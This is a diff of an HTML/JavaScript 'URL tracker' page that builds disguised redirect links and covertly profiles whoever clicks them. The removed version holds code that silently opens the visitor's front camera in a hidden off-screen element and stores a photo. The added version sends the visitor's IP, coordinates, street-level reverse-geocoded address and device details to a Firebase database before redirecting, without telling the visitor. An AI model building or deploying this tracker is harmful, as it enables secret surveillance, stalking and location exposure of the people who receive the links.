@@ -3,144 +3,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced URL Tracker with Camera</title>
+    <title>Multi-Device URL Tracker</title>
     <style>
         :root {
-            --primary: #3b82f6;
-            --primary-dark: #2563eb;
-            --danger: #ef4444;
-            --success: #10b981;
-            --warning: #f59e0b;
-            --light: #f3f4f6;
-            --dark: #111827;
-            --gray: #6b7280;
-        }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            --primary: #4285f4;
+            --danger: #ea4335;
+            --success: #34a853;
+            --light: #f8f9fa;
+            --dark: #202124;
         }
         
         body {
-            background-color: #f9fafb;
-            color: var(--dark);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             line-height: 1.6;
+            margin: 0;
             padding: 20px;
+            background-color: #f5f5f5;
+            color: var(--dark);
         }
         
         .container {
-            max-width: 1200px;
+            max-width: 1000px;
             margin: 0 auto;
             background: white;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
             overflow: hidden;
         }
         
         header {
-            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            background: linear-gradient(135deg, var(--primary), #3367d6);
             color: white;
-            padding: 30px;
+            padding: 25px;
             text-align: center;
         }
         
         .content {
-            padding: 30px;
+            padding: 25px;
         }
         
-        .url-generator {
-            margin-bottom: 40px;
-            padding: 20px;
+        .input-section {
             background: var(--light);
+            padding: 20px;
             border-radius: 8px;
+            margin-bottom: 30px;
         }
         
         .input-group {
             display: flex;
-            margin-bottom: 15px;
             gap: 10px;
+            margin-bottom: 15px;
         }
         
-        .input-group input {
+        input[type="text"] {
             flex: 1;
             padding: 12px 15px;
             border: 1px solid #ddd;
-            border-radius: 5px;
+            border-radius: 4px;
             font-size: 16px;
         }
         
-        .input-group button {
+        button {
             padding: 12px 20px;
-            background-color: var(--primary);
-            color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 4px;
             cursor: pointer;
             font-size: 16px;
-            transition: background-color 0.3s;
-            white-space: nowrap;
+            font-weight: 500;
+            transition: all 0.3s;
         }
         
-        .input-group button:hover {
-            background-color: var(--primary-dark);
+        .btn-primary {
+            background-color: var(--primary);
+            color: white;
         }
         
-        .result {
-            background-color: var(--light);
+        .btn-danger {
+            background-color: var(--danger);
+            color: white;
+        }
+        
+        .btn-success {
+            background-color: var(--success);
+            color: white;
+        }
+        
+        button:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+        }
+        
+        .result-box {
+            background: var(--light);
             padding: 20px;
-            border-radius: 5px;
+            border-radius: 8px;
             margin-top: 20px;
             display: none;
         }
         
         .url-display {
             display: flex;
-            margin: 15px 0;
             gap: 10px;
-        }
-        
-        .url-display input {
-            flex: 1;
-            padding: 10px 15px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            background: white;
-        }
-        
-        .url-display button {
-            padding: 10px 15px;
-            background-color: var(--success);
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            white-space: nowrap;
+            margin: 15px 0;
         }
         
         .controls {
             display: flex;
-            margin-bottom: 20px;
             gap: 10px;
-        }
-        
-        .controls button {
-            padding: 10px 15px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            white-space: nowrap;
-        }
-        
-        #refresh-btn {
-            background-color: var(--primary);
-            color: white;
-        }
-        
-        #clear-btn {
-            background-color: var(--danger);
-            color: white;
+            margin-bottom: 20px;
         }
         
         table {
@@ -157,6 +127,7 @@
         
         th {
             background-color: var(--light);
+            font-weight: 600;
         }
         
         .modal {
@@ -174,26 +145,22 @@
         
         .modal-content {
             background: white;
-            padding: 20px;
-            border-radius: 5px;
-            max-width: 90%;
-            max-height: 90%;
+            padding: 25px;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 800px;
+            max-height: 90vh;
             overflow: auto;
             position: relative;
         }
         
-        .close-modal {
+        .close-btn {
             position: absolute;
-            top: 10px;
-            right: 10px;
-            font-size: 20px;
+            top: 15px;
+            right: 15px;
+            font-size: 24px;
             cursor: pointer;
-        }
-        
-        .map-container {
-            width: 100%;
-            height: 500px;
-            margin-top: 15px;
+            color: var(--dark);
         }
         
         .json-viewer {
@@ -202,69 +169,65 @@
             border-radius: 4px;
             font-family: monospace;
             white-space: pre-wrap;
-            max-height: 400px;
+            max-height: 60vh;
             overflow-y: auto;
+            margin-top: 15px;
         }
         
-        /* Hidden camera elements */
-        #hidden-camera {
-            position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            overflow: hidden;
-        }
-        
-        #camera-preview {
-            display: none;
+        .photo-preview {
+            max-width: 100%;
+            max-height: 60vh;
+            display: block;
+            margin: 15px auto;
+            border: 1px solid #ddd;
+            border-radius: 4px;
         }
         
         @media (max-width: 768px) {
-            .input-group, .url-display {
+            .input-group, .url-display, .controls {
                 flex-direction: column;
-            }
-            
-            .input-group input, .url-display input {
-                margin-bottom: 0;
             }
         }
     </style>
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 </head>
 <body>
     <div class="container">
         <header>
-            <h1>Advanced URL Tracker</h1>
-            <p>Track clicks with location and hidden camera capture</p>
+            <h1>Cross-Device URL Tracker</h1>
+            <p>Track clicks across different devices and networks</p>
         </header>
 
         <div class="content">
-            <div class="url-generator">
-                <h2>Create Tracking URL</h2>
+            <div class="input-section">
+                <h2>Create Tracking Link</h2>
                 <div class="input-group">
-                    <input type="text" id="target-url" placeholder="https://example.com">
-                    <button id="generate-btn">Generate Tracking URL</button>
+                    <input type="text" id="target-url" placeholder="Enter target URL (e.g., https://example.com)">
+                    <button id="generate-btn" class="btn-primary">Generate Link</button>
                 </div>
-                <div class="result" id="tracking-result">
-                    <p>Your tracking URL:</p>
+                <div class="result-box" id="tracking-result">
+                    <p>Your tracking link:</p>
                     <div class="url-display">
                         <input type="text" id="tracking-url" readonly>
-                        <button id="copy-btn">Copy</button>
+                        <button id="copy-btn" class="btn-success">Copy</button>
                     </div>
-                    <p><small>Share this link to track visitors</small></p>
+                    <p><small>Share this link to track visitors across devices</small></p>
                 </div>
             </div>
 
             <div class="tracking-results">
                 <h2>Tracking Results</h2>
                 <div class="controls">
-                    <button id="refresh-btn">Refresh Data</button>
-                    <button id="clear-btn">Clear All Data</button>
+                    <button id="refresh-btn" class="btn-primary">Refresh Data</button>
+                    <button id="clear-btn" class="btn-danger">Clear All Data</button>
                 </div>
                 <table id="results-table">
                     <thead>
                         <tr>
-                            <th>Timestamp</th>
+                            <th>Time</th>
                             <th>IP Address</th>
                             <th>Location</th>
                             <th>Device</th>
@@ -272,29 +235,49 @@
                         </tr>
                     </thead>
                     <tbody id="results-body">
-                        <!-- Results will appear here -->
+                        <!-- Results will be loaded here -->
                     </tbody>
                 </table>
             </div>
         </div>
     </div>
 
-    <!-- Hidden camera elements -->
-    <div id="hidden-camera">
-        <video id="camera-preview" autoplay playsinline></video>
-        <canvas id="camera-canvas" style="display:none;"></canvas>
-    </div>
-
-    <!-- JSON Data Modal -->
-    <div id="json-modal" class="modal">
+    <!-- Modal for Details -->
+    <div id="details-modal" class="modal">
         <div class="modal-content">
-            <span class="close-modal">&times;</span>
+            <span class="close-btn">&times;</span>
             <h3>Detailed Tracking Data</h3>
+            <div id="details-content"></div>
             <div id="json-content" class="json-viewer"></div>
         </div>
     </div>
 
+    <!-- Modal for Photo -->
+    <div id="photo-modal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn">&times;</span>
+            <h3>Captured Photo</h3>
+            <img id="photo-preview" class="photo-preview" src="" alt="Captured photo">
+            <div id="photo-details"></div>
+        </div>
+    </div>
+
     <script>
+    // Firebase configuration (replace with your own)
+    const firebaseConfig = {
+        apiKey: "AIzaSyYOUR_API_KEY",
+        authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+        databaseURL: "https://YOUR_PROJECT_ID.firebaseio.com",
+        projectId: "YOUR_PROJECT_ID",
+        storageBucket: "YOUR_PROJECT_ID.appspot.com",
+        messagingSenderId: "YOUR_SENDER_ID",
+        appId: "YOUR_APP_ID"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
     // DOM Elements
     const targetUrlInput = document.getElementById('target-url');
     const generateBtn = document.getElementById('generate-btn');
@@ -304,51 +287,49 @@
     const refreshBtn = document.getElementById('refresh-btn');
     const clearBtn = document.getElementById('clear-btn');
     const resultsBody = document.getElementById('results-body');
-    const jsonModal = document.getElementById('json-modal');
+    const detailsModal = document.getElementById('details-modal');
+    const photoModal = document.getElementById('photo-modal');
+    const detailsContent = document.getElementById('details-content');
     const jsonContent = document.getElementById('json-content');
-    const closeModal = document.querySelector('.close-modal');
-    
-    // Camera elements
-    const cameraPreview = document.getElementById('camera-preview');
-    const cameraCanvas = document.getElementById('camera-canvas');
-    let cameraStream = null;
+    const photoPreview = document.getElementById('photo-preview');
+    const photoDetails = document.getElementById('photo-details');
+    const closeBtns = document.querySelectorAll('.close-btn');
 
     // Generate Tracking URL
     generateBtn.addEventListener('click', function() {
         const targetUrl = targetUrlInput.value.trim();
         
         if (!targetUrl) {
-            alert('Please enter a URL');
+            alert('Please enter a target URL');
             return;
         }
         
         try {
             new URL(targetUrl);
         } catch {
-            alert('Please enter a valid URL (include http:// or https://)');
+            alert('Invalid URL format. Please include http:// or https://');
             return;
         }
         
-        const trackingId = 'trk_' + Math.random().toString(36).substr(2, 9);
-        const trackingUrl = window.location.origin + window.location.pathname + '?track=' + trackingId + '&target=' + encodeURIComponent(targetUrl);
+        const trackingId = 'trk_' + Math.random().toString(36).substr(2, 10);
+        const trackingUrl = window.location.origin + window.location.pathname + '?track=' + trackingId + '&url=' + encodeURIComponent(targetUrl);
         
         trackingUrlInput.value = trackingUrl;
         trackingResult.style.display = 'block';
         
-        // Save the tracking link
-        const trackingLinks = JSON.parse(localStorage.getItem('trackingLinks') || '{}');
-        trackingLinks[trackingId] = {
-            target: targetUrl,
-            created: new Date().toISOString()
-        };
-        localStorage.setItem('trackingLinks', JSON.stringify(trackingLinks));
+        // Save to Firebase
+        database.ref('trackingLinks/' + trackingId).set({
+            targetUrl: targetUrl,
+            createdAt: firebase.database.ServerValue.TIMESTAMP,
+            clickCount: 0
+        });
     });
 
     // Copy to Clipboard
     copyBtn.addEventListener('click', function() {
         trackingUrlInput.select();
         document.execCommand('copy');
-        alert('URL copied to clipboard!');
+        alert('Link copied to clipboard!');
     });
 
     // Format JSON for display
@@ -356,243 +337,208 @@
         return JSON.stringify(data, null, 2);
     }
 
-    // Load Tracking Results
+    // Format date
+    function formatDate(timestamp) {
+        const date = new Date(timestamp);
+        return date.toLocaleString();
+    }
+
+    // Load Tracking Results from Firebase
     function loadTrackingResults() {
-        const trackingData = JSON.parse(localStorage.getItem('trackingData') || '[]');
-        
-        if (trackingData.length === 0) {
-            resultsBody.innerHTML = '<tr><td colspan="5">No tracking data available</td></tr>';
-            return;
-        }
-        
-        resultsBody.innerHTML = trackingData.map((item, index) => `
-            <tr>
-                <td>${new Date(item.timestamp).toLocaleString()}</td>
-                <td>${item.ip || 'Unknown'}</td>
-                <td>
-                    ${item.location?.city || 'Unknown'}
-                    ${item.latitude ? `<br><small>(${item.latitude}, ${item.longitude})</small>` : ''}
-                </td>
-                <td>${item.device?.type || 'Unknown'}</td>
-                <td>
-                    <button class="view-details" data-index="${index}">View Details</button>
-                    ${item.cameraCapture ? '<button class="view-photo" data-img="' + item.cameraCapture.imageData + '">View Photo</button>' : ''}
-                </td>
-            </tr>
-        `).join('');
-        
-        // Add event listeners to detail buttons
-        document.querySelectorAll('.view-details').forEach(button => {
-            button.addEventListener('click', function() {
-                const index = this.dataset.index;
-                showDetails(trackingData[index]);
+        database.ref('trackingData').orderByChild('timestamp').limitToLast(50).once('value')
+            .then((snapshot) => {
+                const data = snapshot.val();
+                if (!data) {
+                    resultsBody.innerHTML = '<tr><td colspan="5">No tracking data available</td></tr>';
+                    return;
+                }
+                
+                // Convert to array and reverse to show latest first
+                const dataArray = Object.entries(data).map(([key, value]) => ({
+                    id: key,
+                    ...value
+                })).reverse();
+                
+                resultsBody.innerHTML = dataArray.map(item => `
+                    <tr>
+                        <td>${formatDate(item.timestamp)}</td>
+                        <td>${item.ip || 'Unknown'}</td>
+                        <td>
+                            ${item.location?.city || 'Unknown'}
+                            ${item.latitude ? `<br><small>(${item.latitude}, ${item.longitude})</small>` : ''}
+                        </td>
+                        <td>${item.device?.type || 'Unknown'}</td>
+                        <td>
+                            <button class="view-details" data-id="${item.id}">Details</button>
+                            ${item.cameraCapture ? `<button class="view-photo" data-id="${item.id}">Photo</button>` : ''}
+                        </td>
+                    </tr>
+                `).join('');
+                
+                // Add event listeners
+                document.querySelectorAll('.view-details').forEach(btn => {
+                    btn.addEventListener('click', function() {
+                        showDetails(this.dataset.id);
+                    });
+                });
+                
+                document.querySelectorAll('.view-photo').forEach(btn => {
+                    btn.addEventListener('click', function() {
+                        showPhoto(this.dataset.id);
+                    });
+                });
+            })
+            .catch(error => {
+                console.error('Error loading data:', error);
+                resultsBody.innerHTML = '<tr><td colspan="5">Error loading data</td></tr>';
             });
-        });
-        
-        // Add event listeners to photo buttons
-        document.querySelectorAll('.view-photo').forEach(button => {
-            button.addEventListener('click', function() {
-                showPhoto(this.dataset.img);
+    }
+
+    // Show detailed tracking data
+    function showDetails(id) {
+        database.ref('trackingData/' + id).once('value')
+            .then((snapshot) => {
+                const data = snapshot.val();
+                if (!data) return;
+                
+                // Prepare display content
+                let html = `
+                    <p><strong>Target URL:</strong> ${data.target || 'Unknown'}</p>
+                    <p><strong>Time:</strong> ${formatDate(data.timestamp)}</p>
+                    <p><strong>IP Address:</strong> ${data.ip || 'Unknown'}</p>
+                    <p><strong>Location:</strong> ${data.location?.city || 'Unknown'} (${data.latitude || '?'}, ${data.longitude || '?'})</p>
+                    <p><strong>Device:</strong> ${data.device?.type || 'Unknown'} (${data.device?.platform || 'Unknown'})</p>
+                    <p><strong>User Agent:</strong> ${data.userAgent || 'Unknown'}</p>
+                `;
+                
+                detailsContent.innerHTML = html;
+                jsonContent.textContent = formatJSON(data);
+                detailsModal.style.display = 'flex';
             });
+    }
+
+    // Show captured photo
+    function showPhoto(id) {
+        database.ref('trackingData/' + id).once('value')
+            .then((snapshot) => {
+                const data = snapshot.val();
+                if (!data?.cameraCapture) return;
+                
+                photoPreview.src = data.cameraCapture.imageData;
+                photoDetails.innerHTML = `
+                    <p><strong>Captured at:</strong> ${formatDate(data.cameraCapture.timestamp)}</p>
+                    <p><strong>Resolution:</strong> ${data.cameraCapture.imageSize?.width || 0}x${data.cameraCapture.imageSize?.height || 0}</p>
+                `;
+                photoModal.style.display = 'flex';
+            });
+    }
+
+    // Close modals
+    closeBtns.forEach(btn => {
+        btn.addEventListener('click', function() {
+            detailsModal.style.display = 'none';
+            photoModal.style.display = 'none';
         });
-    }
-
-    // Show detailed data in modal
-    function showDetails(data) {
-        const completeData = {
-            timestamp: data.timestamp,
-            targetUrl: data.target,
-            ipInfo: {
-                ip: data.ip,
-                ...(data.ipDetails || {})
-            },
-            deviceInfo: data.device,
-            locationInfo: data.location,
-            nominatimData: data.nominatim,
-            cameraCapture: data.cameraCapture ? {
-                timestamp: data.cameraCapture.timestamp,
-                imageSize: data.cameraCapture.imageSize
-            } : null,
-            userAgent: data.userAgent
-        };
-        
-        jsonContent.textContent = formatJSON(completeData);
-        jsonModal.style.display = 'flex';
-    }
-
-    // Show photo modal
-    function showPhoto(imageData) {
-        const modal = document.createElement('div');
-        modal.className = 'modal';
-        modal.innerHTML = `
-            <div class="modal-content">
-                <span class="close-modal">&times;</span>
-                <h3>Captured Photo</h3>
-                <img src="${imageData}" style="max-width: 100%; max-height: 80vh; display: block; margin: 0 auto;">
-                <p><small>Captured at: ${new Date().toLocaleString()}</small></p>
-            </div>
-        `;
-        
-        modal.querySelector('.close-modal').addEventListener('click', function() {
-            modal.remove();
-        });
-        
-        document.body.appendChild(modal);
-        modal.style.display = 'flex';
-    }
-
-    // Close modal
-    closeModal.addEventListener('click', function() {
-        jsonModal.style.display = 'none';
     });
-
-    // Initialize camera
-    async function initCamera() {
-        try {
-            cameraStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    facingMode: 'user',
-                    width: { ideal: 640 },
-                    height: { ideal: 480 }
-                },
-                audio: false 
-            });
-            cameraPreview.srcObject = cameraStream;
-            return true;
-        } catch (err) {
-            console.error('Camera access error:', err);
-            return false;
-        }
-    }
-
-    // Capture photo from camera
-    async function capturePhoto() {
-        if (!cameraStream) return null;
-        
-        try {
-            const canvas = cameraCanvas;
-            const video = cameraPreview;
-            
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // Stop camera stream immediately after capture
-            cameraStream.getTracks().forEach(track => track.stop());
-            cameraStream = null;
-            
-            return canvas.toDataURL('image/jpeg', 0.7);
-        } catch (err) {
-            console.error('Photo capture error:', err);
-            return null;
-        }
-    }
 
     // Refresh Data
     refreshBtn.addEventListener('click', loadTrackingResults);
 
-    // Clear Data
+    // Clear Data (admin only - for demo purposes)
     clearBtn.addEventListener('click', function() {
-        if (confirm('Are you sure you want to clear all tracking data?')) {
-            localStorage.removeItem('trackingData');
-            localStorage.removeItem('trackingLinks');
-            loadTrackingResults();
+        if (confirm('WARNING: This will delete ALL tracking data. Continue?')) {
+            database.ref('trackingData').remove()
+                .then(() => {
+                    alert('All tracking data has been cleared');
+                    loadTrackingResults();
+                })
+                .catch(error => {
+                    console.error('Error clearing data:', error);
+                    alert('Failed to clear data');
+                });
         }
     });
 
-    // Check for tracking request
-    const params = new URLSearchParams(window.location.search);
-    const trackingId = params.get('track');
-    const targetUrl = params.get('target');
+    // Process tracking when URL has parameters
+    const urlParams = new URLSearchParams(window.location.search);
+    const trackingId = urlParams.get('track');
+    const targetUrl = urlParams.get('url');
     
     if (trackingId && targetUrl) {
-        // Initialize camera and capture photo
-        const processTracking = async () => {
-            const trackingData = {
-                timestamp: new Date().toISOString(),
-                target: decodeURIComponent(targetUrl),
-                referrer: document.referrer || 'Direct',
-                userAgent: navigator.userAgent,
-                device: {
-                    type: /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
-                    platform: navigator.platform,
-                    screen: {
-                        width: screen.width,
-                        height: screen.height,
-                        colorDepth: screen.colorDepth
-                    }
-                }
-            };
-
-            // Try to capture photo (silently fail if not possible)
-            const cameraAccess = await initCamera();
-            if (cameraAccess) {
-                const photoData = await capturePhoto();
-                if (photoData) {
-                    trackingData.cameraCapture = {
-                        timestamp: new Date().toISOString(),
-                        imageData: photoData,
-                        imageSize: {
-                            width: cameraCanvas.width,
-                            height: cameraCanvas.height
-                        }
-                    };
-                }
+        // Collect device and network data
+        const trackingData = {
+            timestamp: firebase.database.ServerValue.TIMESTAMP,
+            target: decodeURIComponent(targetUrl),
+            referrer: document.referrer || 'Direct',
+            userAgent: navigator.userAgent,
+            device: {
+                type: /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+                platform: navigator.platform,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth
+                },
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled
+            },
+            network: {
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : null
             }
+        };
 
-            // Get IP and location data
-            try {
-                const ipResponse = await fetch('https://ipapi.co/json/');
-                const ipData = await ipResponse.json();
-                
+        // Get IP and location data
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(ipData => {
                 trackingData.ip = ipData.ip;
                 trackingData.latitude = ipData.latitude;
                 trackingData.longitude = ipData.longitude;
-                trackingData.ipDetails = {
+                trackingData.location = {
                     city: ipData.city,
                     region: ipData.region,
                     country: ipData.country_name,
                     countryCode: ipData.country_code,
-                    isp: ipData.org,
-                    asn: ipData.asn
+                    postalCode: ipData.postal,
+                    timezone: ipData.timezone
                 };
-
+                
                 // Get detailed address from Nominatim
                 if (ipData.latitude && ipData.longitude) {
-                    const nominatimResponse = await fetch(
-                        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${ipData.latitude}&lon=${ipData.longitude}&zoom=18&addressdetails=1`
-                    );
-                    const nominatimData = await nominatimResponse.json();
-                    
-                    trackingData.location = {
-                        city: nominatimData.address?.city || nominatimData.address?.town,
-                        state: nominatimData.address?.state,
-                        country: nominatimData.address?.country,
-                        fullAddress: nominatimData.display_name
-                    };
-                    
-                    trackingData.nominatim = {
-                        display_name: nominatimData.display_name,
-                        address: nominatimData.address,
-                        boundingbox: nominatimData.boundingbox
-                    };
+                    return fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${ipData.latitude}&lon=${ipData.longitude}&zoom=18&addressdetails=1`)
+                        .then(res => res.json())
+                        .then(nominatimData => {
+                            trackingData.nominatim = {
+                                display_name: nominatimData.display_name,
+                                address: nominatimData.address,
+                                boundingbox: nominatimData.boundingbox
+                            };
+                        });
                 }
-            } catch (error) {
-                console.error('Error fetching location data:', error);
-            }
-
-            // Save to localStorage
-            const allData = JSON.parse(localStorage.getItem('trackingData') || '[]');
-            allData.unshift(trackingData);
-            localStorage.setItem('trackingData', JSON.stringify(allData));
-            
-            // Redirect to target URL
-            window.location.href = decodeURIComponent(targetUrl);
-        };
-
-        // Start tracking process
-        processTracking();
+            })
+            .catch(error => {
+                console.error('Error fetching location:', error);
+            })
+            .finally(() => {
+                // Save to Firebase
+                const newTrackingRef = database.ref('trackingData').push();
+                newTrackingRef.set(trackingData);
+                
+                // Update click count
+                database.ref('trackingLinks/' + trackingId).transaction(link => {
+                    if (link) {
+                        link.clickCount = (link.clickCount || 0) + 1;
+                    }
+                    return link;
+                });
+                
+                // Redirect to target URL
+                window.location.href = decodeURIComponent(targetUrl);
+            });
     }
 
     // Initial load
